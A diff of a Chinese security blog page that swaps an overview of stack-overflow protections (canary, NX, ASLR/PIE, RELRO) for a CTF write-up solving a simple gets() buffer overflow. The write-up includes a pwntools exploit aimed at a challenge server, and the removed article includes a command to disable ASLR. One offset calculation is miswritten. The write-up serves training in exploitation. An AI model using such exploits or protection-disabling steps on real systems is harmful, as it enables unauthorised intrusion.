@@ -6,20 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>栈溢出的保护机制和利用方法 | Thriumph</title>
+  <title>CGCTF-When_did_you_born | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="保护机制Canary(栈保护)栈溢出保护是一种缓冲区溢出攻击的缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址让shellcode能够执行。当开启栈保护后，函数开始执行时会先往栈里插入cookie信息，cookie常在ebp的上方，当函数返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候也会将cookie信息覆盖掉，导致栈保护检查失">
-<meta name="keywords" content="二进制安全">
+  <meta name="description" content="一道简单的溢出">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出的保护机制和利用方法">
-<meta property="og:url" content="https://thriumph.top/栈溢出的保护机制和利用方法.html">
+<meta property="og:title" content="CGCTF-When_did_you_born">
+<meta property="og:url" content="https://thriumph.top/CGCTF-When-did-you-born.html">
 <meta property="og:site_name" content="Thriumph">
-<meta property="og:description" content="保护机制Canary(栈保护)栈溢出保护是一种缓冲区溢出攻击的缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址让shellcode能够执行。当开启栈保护后，函数开始执行时会先往栈里插入cookie信息，cookie常在ebp的上方，当函数返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候也会将cookie信息覆盖掉，导致栈保护检查失">
+<meta property="og:description" content="一道简单的溢出">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-19T12:50:55.019Z">
+<meta property="og:image" content="https://thriumph.top/CGCTF-When-did-you-born/1.png">
+<meta property="og:updated_time" content="2019-10-18T09:27:36.204Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="栈溢出的保护机制和利用方法">
-<meta name="twitter:description" content="保护机制Canary(栈保护)栈溢出保护是一种缓冲区溢出攻击的缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址让shellcode能够执行。当开启栈保护后，函数开始执行时会先往栈里插入cookie信息，cookie常在ebp的上方，当函数返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候也会将cookie信息覆盖掉，导致栈保护检查失">
+<meta name="twitter:title" content="CGCTF-When_did_you_born">
+<meta name="twitter:description" content="一道简单的溢出">
+<meta name="twitter:image" content="https://thriumph.top/CGCTF-When-did-you-born/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -157,14 +159,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-栈溢出的保护机制和利用方法" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-CGCTF-When-did-you-born" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      栈溢出的保护机制和利用方法
+      CGCTF-When_did_you_born
     </h1>
   
 
@@ -184,40 +186,27 @@
 
 
         
-        <a href="/栈溢出的保护机制和利用方法.html" class="archive-article-date">
-  	<time datetime="2019-08-14T12:34:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
+        <a href="/CGCTF-When-did-you-born.html" class="archive-article-date">
+  	<time datetime="2019-10-18T07:40:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h1><h2 id="Canary-栈保护"><a href="#Canary-栈保护" class="headerlink" title="Canary(栈保护)"></a>Canary(栈保护)</h2><p>栈溢出保护是一种缓冲区溢出攻击的缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址让shellcode能够执行。当开启栈保护后，函数开始执行时会先往栈里插入cookie信息，cookie常在ebp的上方，当函数返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候也会将cookie信息覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在linux中将cookie信息称为canary。</p>
+        <p>一道简单的溢出</p>
 <a id="more"></a>
+<h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p><img src="/CGCTF-When-did-you-born/1.png" alt></p>
+<p>没有开启pie保护</p>
+<h1 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's Your Birth?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Cannot Born In 1926!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's Your Name?"</span>);</span><br><span class="line">    gets((__int64)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Shall Have Flag."</span>);</span><br><span class="line">      system(<span class="string">"cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Are Naive."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Speed One Second Here."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>canary 简单高效, 就是插入一个值, 在 stack overflow 发生的高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生。</p>
-<p><strong>gcc中使用Canary</strong></p>
-<p><code>-fstack-protector</code> 启用保护，不过只为局部变量中含有数组的函数插入保护</p>
-<p><code>-fstack-protector-all</code> 启用保护，为所有函数插入保护</p>
-<p><code>-fstack-protector-strong</code></p>
-<p><code>-fstack-protector-explicit</code> 只对有明确stack_protect attribute的函数开启保护</p>
-<p>-fno-stack-protector 禁用保护</p>
-<h2 id="NX-DEP（堆栈不可执行）"><a href="#NX-DEP（堆栈不可执行）" class="headerlink" title="NX/DEP（堆栈不可执行）"></a>NX/DEP（堆栈不可执行）</h2><p>如果发生缓冲区溢出，返回地址被覆盖，就会导致控制流被劫持，漏洞就会被利用。</p>
-<p>NX/DEP（数据执行保护）就是让栈上的地址不可被执行，将数据和代码区分开，让数据不可当作代码执行，，当程序溢出成功转入shellcode时，程序也会停下来不被执行。</p>
-<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数</p>
-<p><code>gcc -z execstack -o test test.c</code></p>
-<h2 id="PIE-ASLR（地址随机化）"><a href="#PIE-ASLR（地址随机化）" class="headerlink" title="PIE/ASLR（地址随机化）"></a>PIE/ASLR（地址随机化）</h2><p><strong>ASLR</strong></p>
-<p>表示地址空间层随机化。这种技术使共享库，堆栈和堆被占用的内存的地址随机化。这防止攻击者预测在哪里采取EIP，因为攻击者不知道他的恶意有效载荷的地址。攻击者难以找到shellcode地址，就算覆盖了返回地址，也不知道覆盖到了什么地方。ASLR在装载过程中对模块随机的装载，无法找到模块的位置和栈的位置，找不到返回地址。</p>
-<p><strong>PIE：</strong><br>位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
-<p><strong>liunx下关闭PIE</strong><br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
-<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>设置符号重定向表格，为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
-<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>栈溢出利用技术基础ROP</p>
-<p>利用signal机制的的ROP技术：SROP</p>
-<p>在没有binary的情况下利用得到BROP</p>
-<p>劫持栈指针stack pivot,通常将栈指针劫持到其他不是栈的区域</p>
-<p>利用动态链接绕过ASLR：ret2dl resolve,fake linkmap</p>
-<p>Partial OverWrite:利用ASLR中低12位不会被随机化的特性来绕过ASLR的，也就是覆盖过程中只覆盖低12位从而绕过ASLR</p>
-<p>当溢出位数不够时可以通过覆盖ebp和partial overwrite</p>
+<p>看到了 <strong>gets((__int64)&amp;v4);</strong> ，典型的溢出，只要覆盖v5为1926(0x786)就行了</p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>计算出v5的偏移，覆盖v5为0x786就行了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure>
+
+<p>0x20-0x18=0x2,偏移为8个字节，填充8个字节的垃圾数据，然后将后四位覆盖为0x786就行了。</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'37142'</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">0x0786</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">p.sendline(<span class="string">"AAAA"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What's Your Name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
       
@@ -252,7 +241,7 @@
           
           <br>
           <strong>本文链接：</strong>
-          https://thriumph.top/栈溢出的保护机制和利用方法.html
+          https://thriumph.top/CGCTF-When-did-you-born.html
           <br>
           <strong>版权声明：</strong>
           本作品采用
@@ -277,7 +266,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -333,7 +326,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//栈溢出的保护机制和利用方法.html" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//CGCTF-When-did-you-born.html" alt="微信分享二维码">
     </div>
 </div>
 
@@ -347,18 +340,9 @@
   
 <nav id="article-nav">
   
-    <a href="/linux下基本缓冲区溢出shellcode编写.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          linux下基本缓冲区溢出shellcode编写
-        
-      </div>
-    </a>
   
-  
-    <a href="/gdb常用命令.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">gdb常用命令</div>
+    <a href="/CGCTF-CGfsb.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CGCTF-CGfsb</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -385,7 +369,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#保护机制"><span class="toc-number">1.</span> <span class="toc-text">保护机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary-栈保护"><span class="toc-number">1.1.</span> <span class="toc-text">Canary(栈保护)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NX-DEP（堆栈不可执行）"><span class="toc-number">1.2.</span> <span class="toc-text">NX/DEP（堆栈不可执行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE-ASLR（地址随机化）"><span class="toc-number">1.3.</span> <span class="toc-text">PIE/ASLR（地址随机化）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RELRO"><span class="toc-number">1.3.1.</span> <span class="toc-text">RELRO</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方法"><span class="toc-number">2.</span> <span class="toc-text">利用方法</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#查看文件"><span class="toc-number">1.</span> <span class="toc-text">查看文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ida分析"><span class="toc-number">2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解题思路"><span class="toc-number">3.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
                     </div>
                 </span>
             </div>
